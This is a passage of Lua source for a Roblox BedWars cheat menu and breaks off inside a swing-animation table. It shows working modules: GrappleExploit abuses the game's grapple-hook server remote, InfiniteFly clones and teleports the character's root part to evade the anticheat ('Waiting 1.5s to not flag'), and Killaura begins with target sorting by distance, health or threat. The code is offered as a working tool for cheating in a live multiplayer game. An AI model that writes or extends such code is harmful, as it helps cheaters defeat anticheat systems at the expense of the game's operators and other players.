	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B"}
	local projectileRemote = bedwars.ClientHandler:Get(bedwars.ProjectileRemote)

	--me when I have to fix bw code omegalol
	bedwars.ClientHandler:Get("GrapplingHookFunctions"):Connect(function(p4)
		if p4.hookFunction == "PLAYER_IN_TRANSIT" then
			bedwars.CooldownController:setOnCooldown("grappling_hook", 3.5)
		end
	end)

	GrappleExploit = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "GrappleExploit",
		Function = function(callback)
			if callback then
				local grappleHooked = false
				table.insert(GrappleExploit.Connections, bedwars.ClientHandler:Get("GrapplingHookFunctions"):Connect(function(p4)
					if p4.hookFunction == "PLAYER_IN_TRANSIT" then
						bedwarsStore.grapple = tick() + 1.8
						grappleHooked = true
						GrappleExploit.ToggleButton(false)
					end
				end))

				local fireball = getItem("grappling_hook")
				if fireball then 
					task.spawn(function()
						repeat task.wait() until bedwars.CooldownController:getRemainingCooldown("grappling_hook") == 0 or (not GrappleExploit.Enabled)
						if (not GrappleExploit.Enabled) then return end
						switchItem(fireball.tool)
						local pos = entityLibrary.character.HumanoidRootPart.CFrame.p
						local offsetshootpos = (CFrame.new(pos, pos + Vector3.new(0, -60, 0)) * CFrame.new(Vector3.new(-bedwars.BowConstantsTable.RelX, -bedwars.BowConstantsTable.RelY, -bedwars.BowConstantsTable.RelZ))).p
						projectileRemote:CallServerAsync(fireball["tool"], nil, "grappling_hook_projectile", offsetshootpos, pos, Vector3.new(0, -60, 0), game:GetService("HttpService"):GenerateGUID(true), {drawDurationSeconds = 1}, workspace:GetServerTimeNow() - 0.045)
					end)
				else
					warningNotification("GrappleExploit", "missing grapple hook", 3)
					GrappleExploit.ToggleButton(false)
					return
				end

				local startCFrame = entityLibrary.isAlive and entityLibrary.character.HumanoidRootPart.CFrame
				RunLoops:BindToHeartbeat("GrappleExploit", function(delta) 
					if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then 
						if bedwars.matchState == 0 then return end
					end
					if entityLibrary.isAlive then
						entityLibrary.character.HumanoidRootPart.Velocity = Vector3.zero
						entityLibrary.character.HumanoidRootPart.CFrame = startCFrame
					end
				end)
			else
				GrappleExploitUp = false
				GrappleExploitDown = false
				RunLoops:UnbindFromHeartbeat("GrappleExploit")
			end
		end,
		HoverText = "Makes you go zoom (longer GrappleExploit discovered by exelys and Cqded)",
		ExtraText = function() 
			if GuiLibrary.ObjectsThatCanBeSaved["Text GUIAlternate TextToggle"]["Api"].Enabled then 
				return alternatelist[table.find(GrappleExploitMode["List"], GrappleExploitMode.Value)]
			end
			return GrappleExploitMode.Value 
		end
	})
end)

runFunction(function()
	local InfiniteFly = {Enabled = false}
	local InfiniteFlyMode = {Value = "CFrame"}
	local InfiniteFlySpeed = {Value = 23}
	local InfiniteFlyVerticalSpeed = {Value = 40}
	local InfiniteFlyVertical = {Enabled = true}
	local InfiniteFlyUp = false
	local InfiniteFlyDown = false
	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B"}
	local clonesuccess = false
	local disabledproper = true
	local oldcloneroot
	local cloned
	local clone
	local bodyvelo
	local FlyOverlap = OverlapParams.new()
	FlyOverlap.MaxParts = 9e9
	FlyOverlap.FilterDescendantsInstances = {}
	FlyOverlap.RespectCanCollide = true

	local function disablefunc()
		if bodyvelo then bodyvelo:Destroy() end
		RunLoops:UnbindFromHeartbeat("InfiniteFlyOff")
		disabledproper = true
		if not oldcloneroot or not oldcloneroot.Parent then return end
		lplr.Character.Parent = game
		oldcloneroot.Parent = lplr.Character
		lplr.Character.PrimaryPart = oldcloneroot
		lplr.Character.Parent = workspace
		oldcloneroot.CanCollide = true
		for i,v in pairs(lplr.Character:GetDescendants()) do 
			if v:IsA("Weld") or v:IsA("Motor6D") then 
				if v.Part0 == clone then v.Part0 = oldcloneroot end
				if v.Part1 == clone then v.Part1 = oldcloneroot end
			end
			if v:IsA("BodyVelocity") then 
				v:Destroy()
			end
		end
		for i,v in pairs(oldcloneroot:GetChildren()) do 
			if v:IsA("BodyVelocity") then 
				v:Destroy()
			end
		end
		local oldclonepos = clone.Position.Y
		if clone then 
			clone:Destroy()
			clone = nil
		end
		lplr.Character.Humanoid.HipHeight = hip or 2
		local origcf = {oldcloneroot.CFrame:GetComponents()}
		origcf[2] = oldclonepos
		oldcloneroot.CFrame = CFrame.new(unpack(origcf))
		oldcloneroot = nil
	end

	InfiniteFly = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "InfiniteFly",
		Function = function(callback)
			if callback then
				if not entityLibrary.isAlive then 
					disabledproper = true
				end
				if not disabledproper then 
					warningNotification("InfiniteFly", "Wait for the last fly to finish", 3)
					InfiniteFly.ToggleButton(false)
					return 
				end
				table.insert(InfiniteFly.Connections, inputService.InputBegan:Connect(function(input1)
					if InfiniteFlyVertical.Enabled and inputService:GetFocusedTextBox() == nil then
						if input1.KeyCode == Enum.KeyCode.Space or input1.KeyCode == Enum.KeyCode.ButtonA then
							InfiniteFlyUp = true
						end
						if input1.KeyCode == Enum.KeyCode.LeftShift or input1.KeyCode == Enum.KeyCode.ButtonL2 then
							InfiniteFlyDown = true
						end
					end
				end))
				table.insert(InfiniteFly.Connections, inputService.InputEnded:Connect(function(input1)
					if input1.KeyCode == Enum.KeyCode.Space or input1.KeyCode == Enum.KeyCode.ButtonA then
						InfiniteFlyUp = false
					end
					if input1.KeyCode == Enum.KeyCode.LeftShift or input1.KeyCode == Enum.KeyCode.ButtonL2 then
						InfiniteFlyDown = false
					end
				end))
				if inputService.TouchEnabled then
					pcall(function()
						local jumpButton = lplr.PlayerGui.TouchGui.TouchControlFrame.JumpButton
						table.insert(InfiniteFly.Connections, jumpButton:GetPropertyChangedSignal("ImageRectOffset"):Connect(function()
							InfiniteFlyUp = jumpButton.ImageRectOffset.X == 146
						end))
						InfiniteFlyUp = jumpButton.ImageRectOffset.X == 146
					end)
				end
				clonesuccess = false
				if entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart) then
					cloned = lplr.Character
					oldcloneroot = entityLibrary.character.HumanoidRootPart
					if not lplr.Character.Parent then 
						InfiniteFly.ToggleButton(false)
						return
					end
					lplr.Character.Parent = game
					clone = oldcloneroot:Clone()
					clone.Parent = lplr.Character
					oldcloneroot.Parent = gameCamera
					bedwars.QueryUtil:setQueryIgnored(oldcloneroot, true)
					clone.CFrame = oldcloneroot.CFrame
					lplr.Character.PrimaryPart = clone
					lplr.Character.Parent = workspace
					for i,v in pairs(lplr.Character:GetDescendants()) do 
						if v:IsA("Weld") or v:IsA("Motor6D") then 
							if v.Part0 == oldcloneroot then v.Part0 = clone end
							if v.Part1 == oldcloneroot then v.Part1 = clone end
						end
						if v:IsA("BodyVelocity") then 
							v:Destroy()
						end
					end
					for i,v in pairs(oldcloneroot:GetChildren()) do 
						if v:IsA("BodyVelocity") then 
							v:Destroy()
						end
					end
					if hip then 
						lplr.Character.Humanoid.HipHeight = hip
					end
					hip = lplr.Character.Humanoid.HipHeight
					clonesuccess = true
				end
				if not clonesuccess then 
					warningNotification("InfiniteFly", "Character missing", 3)
					InfiniteFly.ToggleButton(false)
					return 
				end
				local goneup = false
				RunLoops:BindToHeartbeat("InfiniteFly", function(delta) 
					if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then 
						if bedwarsStore.matchState == 0 then return end
					end
					if entityLibrary.isAlive then
						if isnetworkowner(oldcloneroot) then 
							local playerMass = (entityLibrary.character.HumanoidRootPart:GetMass() - 1.4) * (delta * 100)
							
							local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (InfiniteFlyMode.Value == "Normal" and InfiniteFlySpeed.Value or 20)
							entityLibrary.character.HumanoidRootPart.Velocity = flyVelocity + (Vector3.new(0, playerMass + (InfiniteFlyUp and InfiniteFlyVerticalSpeed.Value or 0) + (InfiniteFlyDown and -InfiniteFlyVerticalSpeed.Value or 0), 0))
							if InfiniteFlyMode.Value ~= "Normal" then
								entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * ((InfiniteFlySpeed.Value + getSpeed()) - 20)) * delta
							end

							local speedCFrame = {oldcloneroot.CFrame:GetComponents()}
							speedCFrame[1] = clone.CFrame.X
							if speedCFrame[2] < 1000 or (not goneup) then 
								task.spawn(warningNotification, "InfiniteFly", "Teleported Up", 3)
								speedCFrame[2] = 100000
								goneup = true
							end
							speedCFrame[3] = clone.CFrame.Z
							oldcloneroot.CFrame = CFrame.new(unpack(speedCFrame))
							oldcloneroot.Velocity = Vector3.new(clone.Velocity.X, oldcloneroot.Velocity.Y, clone.Velocity.Z)
						else
							InfiniteFly.ToggleButton(false)
						end
					end
				end)
			else
				RunLoops:UnbindFromHeartbeat("InfiniteFly")
				if clonesuccess and oldcloneroot and clone and lplr.Character.Parent == workspace and oldcloneroot.Parent ~= nil and disabledproper and cloned == lplr.Character then 
					local rayparams = RaycastParams.new()
					rayparams.FilterDescendantsInstances = {lplr.Character, gameCamera}
					rayparams.RespectCanCollide = true
					local ray = workspace:Raycast(Vector3.new(oldcloneroot.Position.X, clone.CFrame.p.Y, oldcloneroot.Position.Z), Vector3.new(0, -1000, 0), rayparams)
					local origcf = {clone.CFrame:GetComponents()}
					origcf[1] = oldcloneroot.Position.X
					origcf[2] = ray and ray.Position.Y + (entityLibrary.character.Humanoid.HipHeight + (oldcloneroot.Size.Y / 2)) or clone.CFrame.p.Y
					origcf[3] = oldcloneroot.Position.Z
					oldcloneroot.CanCollide = true
					bodyvelo = Instance.new("BodyVelocity")
					bodyvelo.MaxForce = Vector3.new(0, 9e9, 0)
					bodyvelo.Velocity = Vector3.new(0, -1, 0)
					bodyvelo.Parent = oldcloneroot
					oldcloneroot.Velocity = Vector3.new(clone.Velocity.X, -1, clone.Velocity.Z)
					RunLoops:BindToHeartbeat("InfiniteFlyOff", function(dt)
						if oldcloneroot then 
							oldcloneroot.Velocity = Vector3.new(clone.Velocity.X, -1, clone.Velocity.Z)
							local bruh = {clone.CFrame:GetComponents()}
							bruh[2] = oldcloneroot.CFrame.Y
							local newcf = CFrame.new(unpack(bruh))
							FlyOverlap.FilterDescendantsInstances = {lplr.Character, gameCamera}
							local allowed = true
							for i,v in pairs(workspace:GetPartBoundsInRadius(newcf.p, 2, FlyOverlap)) do 
								if (v.Position.Y + (v.Size.Y / 2)) > (newcf.p.Y + 0.5) then 
									allowed = false
									break
								end
							end
							if allowed then
								oldcloneroot.CFrame = newcf
							end
						end
					end)
					oldcloneroot.CFrame = CFrame.new(unpack(origcf))
					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
					disabledproper = false
					if isnetworkowner(oldcloneroot) then 
						warningNotification("InfiniteFly", "Waiting 1.5s to not flag", 3)
						task.delay(1.5, disablefunc)
					else
						disablefunc()
					end
				end
				InfiniteFlyUp = false
				InfiniteFlyDown = false
			end
		end,
		HoverText = "Makes you go zoom",
		ExtraText = function()
			return "Heatseeker"
		end
	})
	InfiniteFlySpeed = InfiniteFly.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 23,
		Function = function(val) end, 
		Default = 23
	})
	InfiniteFlyVerticalSpeed = InfiniteFly.CreateSlider({
		Name = "Vertical Speed",
		Min = 1,
		Max = 100,
		Function = function(val) end, 
		Default = 44
	})
	InfiniteFlyVertical = InfiniteFly.CreateToggle({
		Name = "Y Level",
		Function = function() end, 
		Default = true
	})
end)

local killauraNearPlayer
runFunction(function()
	local killauraboxes = {}
    local killauratargetframe = {Players = {Enabled = false}}
	local killaurasortmethod = {Value = "Distance"}
    local killaurarealremote = bedwars.ClientHandler:Get(bedwars.AttackRemote).instance
    local killauramethod = {Value = "Normal"}
	local killauraothermethod = {Value = "Normal"}
    local killauraanimmethod = {Value = "Normal"}
    local killaurarange = {Value = 14}
    local killauraangle = {Value = 360}
    local killauratargets = {Value = 10}
	local killauraautoblock = {Enabled = false}
    local killauramouse = {Enabled = false}
    local killauracframe = {Enabled = false}
    local killauragui = {Enabled = false}
    local killauratarget = {Enabled = false}
    local killaurasound = {Enabled = false}
    local killauraswing = {Enabled = false}
	local killaurasync = {Enabled = false}
    local killaurahandcheck = {Enabled = false}
    local killauraanimation = {Enabled = false}
	local killauraanimationtween = {Enabled = false}
	local killauracolor = {Value = 0.44}
	local killauranovape = {Enabled = false}
	local killauratargethighlight = {Enabled = false}
	local killaurarangecircle = {Enabled = false}
	local killaurarangecirclepart
	local killauraaimcircle = {Enabled = false}
	local killauraaimcirclepart
	local killauraparticle = {Enabled = false}
	local killauraparticlepart
    local Killauranear = false
    local killauraplaying = false
    local oldViewmodelAnimation = function() end
    local oldPlaySound = function() end
    local originalArmC0 = nil
	local killauracurrentanim
	local animationdelay = tick()

	local function getStrength(plr)
		local inv = bedwarsStore.inventories[plr.Player]
		local strength = 0
		local strongestsword = 0
		if inv then
			for i,v in pairs(inv.items) do 
				local itemmeta = bedwars.ItemTable[v.itemType]
				if itemmeta and itemmeta.sword and itemmeta.sword.damage > strongestsword then 
					strongestsword = itemmeta.sword.damage / 100
				end	
			end
			strength = strength + strongestsword
			for i,v in pairs(inv.armor) do 
				local itemmeta = bedwars.ItemTable[v.itemType]
				if itemmeta and itemmeta.armor then 
					strength = strength + (itemmeta.armor.damageReductionMultiplier or 0)
				end
			end
			strength = strength
		end
		return strength
	end

	local kitpriolist = {
		hannah = 5,
		spirit_assassin = 4,
		dasher = 3,
		jade = 2,
		regent = 1
	}

	local killaurasortmethods = {
		Distance = function(a, b)
			return (a.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position).Magnitude < (b.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position).Magnitude
		end,
		Health = function(a, b) 
			return a.Humanoid.Health < b.Humanoid.Health
		end,
		Threat = function(a, b) 
			return getStrength(a) > getStrength(b)
		end,
		Kit = function(a, b)
			return (kitpriolist[a.Player:GetAttribute("PlayingAsKit")] or 0) > (kitpriolist[b.Player:GetAttribute("PlayingAsKit")] or 0)
		end
	}

	local originalNeckC0
	local originalRootC0
	local anims = {
		Normal = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.05},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.05}
		},
		Slow = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.15},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.15}
		},
		New = {
			{CFrame = CFrame.new(0.69, -0.77, 1.47) * CFrame.Angles(math.rad(-33), math.rad(57), math.rad(-81)), Time = 0.12},
			{CFrame = CFrame.new(0.74, -0.92, 0.88) * CFrame.Angles(math.rad(147), math.rad(71), math.rad(53)), Time = 0.12}
		},
		Latest = {
			{CFrame = CFrame.new(0.69, -0.7, 0.1) * CFrame.Angles(math.rad(-65), math.rad(55), math.rad(-51)), Time = 0.1},
			{CFrame = CFrame.new(0.16, -1.16, 0.5) * CFrame.Angles(math.rad(-179), math.rad(54), math.rad(33)), Time = 0.1}
		},
		["Vertical Spin"] = {
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-90), math.rad(8), math.rad(5)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(180), math.rad(3), math.rad(13)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(90), math.rad(-5), math.rad(8)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(-0), math.rad(-0)), Time = 0.1}
		},
		Exhibition = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2}
		},
		["Exhibition Old"] = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.05},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
			{CFrame = CFrame.new(0.63, -0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.15}
		},
		Slowest = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.1},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.15},
			{CFrame = CFrame.new(0.69, -0.72, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.15},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.15},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.1},
		},
		Mix = {
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.1},
			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.1},
			{CFrame = CFrame.new(0.69, -0.7, 0.1) * CFrame.Angles(math.rad(-65), math.rad(55), math.rad(-51)), Time = 0.1},
			{CFrame = CFrame.new(0.16, -1.16, 0.5) * CFrame.Angles(math.rad(-179), math.rad(54), math.rad(33)), Time = 0.1},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2},
			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.13},
			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.09},
			{CFrame = CFrame.new(0.39, 0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.13},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-90), math.rad(8), math.rad(5)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(180), math.rad(3), math.rad(13)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(90), math.rad(-5), math.rad(8)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(-0), math.rad(-0)), Time = 0.1}, --if you're seeing this, yes i did add all animations into 1 and yes i did have to remove animations for it to fit
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.05},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
			{CFrame = CFrame.new(0.63, -0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.15},
		},
		Acronisware = {
			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.03},
			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
			{CFrame = CFrame.new(0.39, 0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.13},
		},
		["Old Extend"] = {
		    {CFrame = CFrame.new(3, 0, 1) * CFrame.Angles(math.rad(-60), math.rad(30), math.rad(-40)), Time = 0.1},
            {CFrame = CFrame.new(3.3, -.2, 0.7) * CFrame.Angles(math.rad(-70), math.rad(10), math.rad(-20)), Time = 0.2},
            {CFrame = CFrame.new(3.8, -.2, 1.3) * CFrame.Angles(math.rad(-80), math.rad(0), math.rad(-20)), Time = 0.01},
            {CFrame = CFrame.new(3, .3, 1.3) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-20)), Time = 0.07},
            {CFrame = CFrame.new(3, .3, .8) * CFrame.Angles(math.rad(-90), math.rad(10), math.rad(-40)), Time = 0.07}
		},
		["Horizontal Spin"] = {
		    {CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-80)), Time = 0.14},
            {CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(-100)), Time = 0.14},
            {CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(180), math.rad(-100)), Time = 0.14},
            {CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(270), math.rad(-80)), Time = 0.14}
		},
		["BlockHit"] = {
		    {CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-60), math.rad(60), math.rad(-70)), Time = 0.15},
            {CFrame = CFrame.new(0.5, -0.7, -0.2) * CFrame.Angles(math.rad(-120), math.rad(60), math.rad(-50)), Time = 0.15}
		},
		["Rise"] = {
		    {CFrame = CFrame.new(0.9, 0, 0) * CFrame.Angles(math.rad(-80), math.rad(60), math.rad(-40)), Time = 0.14},
            {CFrame = CFrame.new(0.5, 0.2, -0.7) * CFrame.Angles(math.rad(-150), math.rad(55), math.rad(20)), Time = 0.14}
		},
		["Jab"] = {
		    {CFrame = CFrame.new(0.8, -0.7, 0.6) * CFrame.Angles(math.rad(-40), math.rad(65), math.rad(-90)), Time = 0.15},
            {CFrame = CFrame.new(0.6, -0.6, 0.5) * CFrame.Angles(math.rad(-45), math.rad(50), math.rad(-105)), Time = 0.1}
		},
		["Exhibition2"] = {
		    {CFrame = CFrame.new(1, 0, 0) * CFrame.Angles(math.rad(-40), math.rad(40), math.rad(-80)), Time = 0.12},
            {CFrame = CFrame.new(1, 0, -0.3) * CFrame.Angles(math.rad(-80), math.rad(40), math.rad(-60)), Time = 0.16}
		},
		["Smooth"] = {
		    {CFrame = CFrame.new(1, 0, -0.5) * CFrame.Angles(math.rad(-90), math.rad(60), math.rad(-60)), Time = 0.2},
            {CFrame = CFrame.new(1, -0.2, -0.5) * CFrame.Angles(math.rad(-160), math.rad(60), math.rad(-30)), Time = 0.12}
		},
		["Butter"] = {
		    {CFrame = CFrame.new(3.0, -1.7, -1.1) * CFrame.Angles(math.rad(307), math.rad(57), math.rad(145)), Time = 0.18},
            {CFrame = CFrame.new(3.0, -1.7, -1.3) * CFrame.Angles(math.rad(203), math.rad(57), math.rad(226)), Time = 0.14}
		},
		["Slash"] = {
		    {CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.01},
            {CFrame = CFrame.new(-1.71, -1.11, -0.94) * CFrame.Angles(math.rad(-105), math.rad(85), math.rad(7)), Time = 0.19}
		},
		["Slide"] = {
		    {CFrame = CFrame.new(0.2, -0.7, 0) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.15},
            {CFrame = CFrame.new(0.2, -1, 0) * CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111)), Time = 0.3},
            {CFrame = CFrame.new(0.2, -1, -10) * CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111)), Time = 0.0},
            {CFrame = CFrame.new(0.2, -0.7, 0) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.1},
            {CFrame = CFrame.new(0.2, -1, 0) * CFrame.Angles(math.rad(23), math.rad(67), math.rad(-111)), Time = 0.3}
		},
		["Swong"] = {
		    {CFrame = CFrame.new(0, 0, -0.6) * CFrame.Angles(math.rad(-60), math.rad(50), math.rad(-70)), Time = 0.1},
            {CFrame = CFrame.new(0, -0.3, -0.6) * CFrame.Angles(math.rad(-160), math.rad(60), math.rad(10)), Time = 0.2}
		},
		["Kill X"] = {
		    {CFrame = CFrame.new(0.8, -0.92, 0.9) * CFrame.Angles(math.rad(147), math.rad(140), math.rad(53)), Time = 0.12},
			{CFrame = CFrame.new(0.8, -0.92, 0.9) * CFrame.Angles(math.rad(147), math.rad(45), math.rad(53)), Time = 0.12}
		},
		["Stab"] = {
		    {CFrame = CFrame.new(0.69, -0.77, 1.47) * CFrame.Angles(math.rad(-33), math.rad(57), math.rad(-81)), Time = 0.1, Size = 2},
			{CFrame = CFrame.new(0.69, -0.77, 1.47) * CFrame.Angles(math.rad(-33), math.rad(90), math.rad(-81)), Time = 0.1, Size = 5}
		},
		["Exhibition vertical spin"] = {
		    {CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.05},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.1},
			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
			{CFrame = CFrame.new(0.63, -0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.15},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-90), math.rad(8), math.rad(5)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(180), math.rad(3), math.rad(13)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(90), math.rad(-5), math.rad(8)), Time = 0.1},
			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(-0), math.rad(-0)), Time = 0.1}
		},
		["LiquidBounce"] = {
		    {CFrame = CFrame.new(0, 0, -1) * CFrame.Angles(math.rad(-40), math.rad(60), math.rad(-80)), Time = 0.17},
            {CFrame = CFrame.new(0, 0, -1) * CFrame.Angles(math.rad(-60), math.rad(60), math.rad(-80)), Time = 0.17}
		},
		["OddSwing"] = {
		    {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.15},
            {CFrame = CFrame.new(0.03, 0.07, -0.07) * CFrame.Angles(math.rad(-20), math.rad(-2), math.rad(-8)), Time = 0.15}
		},
		["Sigma"] = {
		    {CFrame = CFrame.new(0.3, -0.8, -1.3) * CFrame.Angles(math.rad(160), math.rad(84), math.rad(90)), Time = 0.18},
            {CFrame = CFrame.new(0.3, -0.9, -1.17) * CFrame.Angles(math.rad(160), math.rad(70), math.rad(90)), Time = 0.18},
            {CFrame = CFrame.new(0.4, -0.65, -0.8) * CFrame.Angles(math.rad(160), math.rad(111), math.rad(90)), Time = 0.18}
		},
		["Sigma2"] = {
		    {CFrame = CFrame.new(0.2, 0, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.18},
            {CFrame = CFrame.new(0, -0.2, -1.7) * CFrame.Angles(math.rad(30), math.rad(111), math.rad(190)), Time = 0.18}
		},
		["Drop"] = {
		    {CFrame = CFrame.new(-0.4, -0.7, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.23},
            {CFrame = CFrame.new(-0.8, -0.9, -1.7) * CFrame.Angles(math.rad(20), math.rad(130), math.rad(180)), Time = 0.23},
            {CFrame = CFrame.new(-0.4, -0.7, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.23},
            {CFrame = CFrame.new(-0.8, -0.9, -1.7) * CFrame.Angles(math.rad(20), math.rad(130), math.rad(180)), Time = 0.23},
            {CFrame = CFrame.new(-0.8, -0.6, -1) * CFrame.Angles(math.rad(20), math.rad(130), math.rad(180)), Time = 0.19}
		},
		["Cookless"] = {
		    {CFrame = CFrame.new(2, -2.5, 0.2) * CFrame.Angles(math.rad(268), math.rad(54), math.rad(327)), Time = 0.17},
            {CFrame = CFrame.new(1.6, -2.5, 0.2) * CFrame.Angles(math.rad(189), math.rad(52), math.rad(347)), Time = 0.16}
		},
		["Roll"] = {
		    {CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.2},
            {CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(295), math.rad(60), math.rad(100)), Time = 0.2}
		},
		["Shrink"] = {
